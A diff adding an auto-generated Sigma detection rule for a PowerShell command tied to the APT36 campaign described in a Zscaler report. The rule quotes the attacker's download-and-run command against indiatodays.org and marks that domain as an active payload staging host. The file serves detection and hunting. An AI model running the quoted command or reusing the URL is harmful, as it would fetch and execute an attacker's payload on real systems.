@@ -1,0 +1,37 @@
+title: 'Command the source shows being run: powershell indiatodays.org/pv'
+id: 8521a662-9f69-4444-9072-b864b0045d7c
+status: experimental
+description: 'Deterministic rule built from a command quoted in the primary source, with no model involvement.
+  The source shows this command being run: "powershell -EncodedCommand [irm indiatodays.org/pv".'
+references:
+- https://www.zscaler.com/blogs/security-research/operation-rapidrust-apt36-deploys-rustyshade-rustymove-psnatch-and
+author: hecate (auto-generated from commands quoted in the source - requires analyst review)
+date: '2026-10-10'
+tags:
+- attack.t1059.001
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: \powershell.exe
+    CommandLine|contains: indiatodays.org/pv
+  condition: selection
+falsepositives:
+- Administrators or software running the same command for legitimate reasons
+level: medium
+hecate_provenance:
+- value: http://indiatodays.org/pv
+  type: url
+  role: unknown
+  status: unknown
+  confidence: unknown
+  source: cti
+- value: indiatodays.org
+  type: domain
+  role: staging
+  status: active
+  confidence: unknown
+  source: https://www.zscaler.com/blogs/security-research/operation-rapidrust-apt36-deploys-rustyshade-rustymove-psnatch-and
+  evidence: Payload staging domain indiatodays[.]org
+hunt_id: H-0691
